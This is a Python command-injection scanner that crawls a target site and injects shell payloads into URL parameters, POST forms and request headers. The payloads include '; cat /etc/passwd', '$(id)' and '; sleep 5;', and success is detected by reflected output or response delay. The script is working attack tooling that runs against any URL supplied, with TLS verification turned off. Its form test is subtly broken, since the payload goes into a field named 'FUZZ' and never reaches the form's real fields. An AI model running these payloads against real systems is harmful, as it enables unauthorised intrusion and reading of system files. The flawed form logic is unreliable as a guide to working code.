#!/usr/bin/env python3
"""cmd_injection_scanner.py – Lightweight command‑injection hunting tool

Features
========
* **Crawls** target site (links + forms) to chosen depth
* Tests parameters with **shell‑style payloads**:
    - Error reflection (e.g., `; cat /etc/passwd`) – look for `root:` / `/bin/bash`
    - Output reflection (e.g., `$(id)`) – look for `uid=`
    - **Time‑delay blind** payloads (`; sleep 5;`) – measure response latency
* Supports **cookie** & **header** fuzzing (`X‑Api-Version`, `User‑Agent`)
* Concurrency via ThreadPool, progress via *tqdm*
* CLI via *argparse* (`--url`, `--depth`, `--threads`, `--timeout`, `--proxy` …)
* Pure‑Python (httpx + bs4 + tqdm + colorama)

Install:
    pip install httpx beautifulsoup4 tqdm colorama

Example:
    python cmd_injection_scanner.py --url https://target.local --depth 2 --threads 12
"""

import argparse, httpx, re, sys, time, threading, queue, contextlib
from urllib.parse import urljoin, urlsplit, urlunsplit, urlencode, parse_qsl
from bs4 import BeautifulSoup
from colorama import Fore, Style
from tqdm import tqdm

###############################################################################
# Payload definitions
###############################################################################

ERR_PAYLOAD = "; cat /etc/passwd"
REFLECT_REGEX = re.compile(r"root:.*:/bin/(bash|sh)")

UID_PAYLOAD = "$(id)"  # or `; id` but $() safer for various shells
UID_REGEX = re.compile(r"uid=\d+")

SLEEP_PAYLOAD = "; sleep 5;"  # works on most *nix shells
SLEEP_THRESHOLD = 4.5           # seconds over baseline

HDRS_TO_FUZZ = ["User-Agent", "X-Api-Version"]

###############################################################################
# CLI
###############################################################################

def parse_args():
    p = argparse.ArgumentParser(description="Command‑injection detector")
    p.add_argument("--url", required=True, help="Seed URL (e.g. https://site)")
    p.add_argument("--depth", type=int, default=1, help="Crawl depth")
    p.add_argument("--threads", type=int, default=10)
    p.add_argument("--timeout", type=float, default=8.0)
    p.add_argument("--proxy", help="Proxy URL (http://127.0.0.1:8080)")
    return p.parse_args()

###############################################################################
# HTTP helpers
###############################################################################

def make_client(args):
    proxies = {"http://": args.proxy, "https://": args.proxy} if args.proxy else None
    return httpx.Client(timeout=args.timeout, verify=False, headers={"User-Agent": "cmdscan/1.0"}, proxies=proxies)

###############################################################################
# Crawler
###############################################################################

def crawl(client, seed, max_depth):
    seen, q = set(), queue.Queue()
    q.put((seed, 0))
    pages = []

    while not q.empty():
        url, depth = q.get()
        if url in seen or depth > max_depth:
            continue
        seen.add(url)
        try:
            r = client.get(url, follow_redirects=True)
        except Exception:
            continue
        pages.append((url, r))
        if "text/html" not in r.headers.get("content-type", ""):
            continue
        soup = BeautifulSoup(r.text, "html.parser")
        # links
        for tag in soup.find_all("a", href=True):
            nxt = urljoin(url, tag["href"])
            q.put((nxt, depth + 1))
        # forms
        for form in soup.find_all("form"):
            pages.append((url, form))
    return pages

###############################################################################
# Mutate helpers
###############################################################################

def inject_get(url, param, payload):
    parts = urlsplit(url)
    qs = dict(parse_qsl(parts.query))
    qs[param] = payload
    return urlunsplit((*parts[:3], urlencode(qs), parts.fragment))

###############################################################################
# Scanner logic
###############################################################################

findings = []  # (risk, location, param, note)
lock = threading.Lock()


def test_error_reflect(client, method, url, data_or_param, is_get):
    try:
        if is_get:
            test_url = inject_get(url, data_or_param, ERR_PAYLOAD)
            r = client.get(test_url)
        else:
            r = client.post(url, data={**data_or_param, "FUZZ": ERR_PAYLOAD})
        if REFLECT_REGEX.search(r.text):
            with lock:
                findings.append(("HIGH", url, data_or_param, "/etc/passwd reflection"))
            return True
    except Exception:
        pass
    return False


def test_uid_reflect(client, method, url, data_or_param, is_get):
    try:
        if is_get:
            test_url = inject_get(url, data_or_param, UID_PAYLOAD)
            r = client.get(test_url)
        else:
            r = client.post(url, data={**data_or_param, "FUZZ": UID_PAYLOAD})
        if UID_REGEX.search(r.text):
            with lock:
                findings.append(("HIGH", url, data_or_param, "uid reflection"))
            return True
    except Exception:
        pass
    return False


def test_time_delay(client, method, url, param, baseline_time):
    try:
        test_url = inject_get(url, param, SLEEP_PAYLOAD)
        t0 = time.perf_counter()
        client.get(test_url, timeout=baseline_time + SLEEP_THRESHOLD + 2)
        if time.perf_counter() - t0 - baseline_time > SLEEP_THRESHOLD:
            with lock:
                findings.append(("MEDIUM", url, param, "sleep delay"))
    except httpx.ReadTimeout:
        with lock:
            findings.append(("MEDIUM", url, param, "timeout delay"))

###############################################################################
# Worker
###############################################################################

def worker(client, q, args, pbar):
    while True:
        try:
            task = q.get_nowait()
        except queue.Empty:
            return
        url, obj = task
        if isinstance(obj, httpx.Response):
            # GET param scan
            params = dict(parse_qsl(urlsplit(url).query))
            baseline_time = obj.elapsed.total_seconds() if obj.elapsed else 0
            for p in params:
                test_error_reflect(client, "GET", url, p, True)
                test_uid_reflect(client, "GET", url, p, True)
                test_time_delay(client, "GET", url, p, baseline_time)

            # Header fuzz
            for hdr in HDRS_TO_FUZZ:
                try:
                    h = {hdr: UID_PAYLOAD}
                    r = client.get(url, headers=h)
                    if UID_REGEX.search(r.text):
                        with lock:
                            findings.append(("HIGH", url, hdr, "header uid reflection"))
                except Exception:
                    pass
        else:
            # FORM scan (POST only)
            form = obj
            method = form.get("method", "GET").upper()
            if method != "POST":  # keep simple
                q.task_done()
                pbar.update(1)
                continue
            action = urljoin(url, form.get("action", url))
            inputs = {inp.get("name"): "FUZZ" for inp in form.find_all("input") if inp.get("name")}
            test_error_reflect(client, "POST", action, inputs, False)
            test_uid_reflect(client, "POST", action, inputs, False)
        q.task_done()
        pbar.update(1)

###############################################################################
# Main
###############################################################################

if __name__ == "__main__":
    args = parse_args()
    client = make_client(args)

    print(f"{Fore.CYAN}[+] Crawling target…{Style.RESET_ALL}")
    pages = crawl(client, args.url, args.depth)

    q = queue.Queue()
    for p in pages:
        q.put(p)

    pbar = tqdm(total=q.qsize(), desc="Scanning")

    threads = [threading.Thread(target=worker, args=(client, q, args, pbar), daemon=True) for _ in range(args.threads)]
    [t.start() for t in threads]
    [t.join() for t in threads]
    pbar.close()

    if findings:
        for lvl, loc, param, note in findings:
            color = Fore.RED if lvl == "HIGH" else Fore.YELLOW
            print(f"{color}[{lvl}] {loc} param={param} ({note}){Style.RESET_ALL}")
    else:
        print(f"{Fore.GREEN}[-] No cmd‑injection indicators found.{Style.RESET_ALL}")
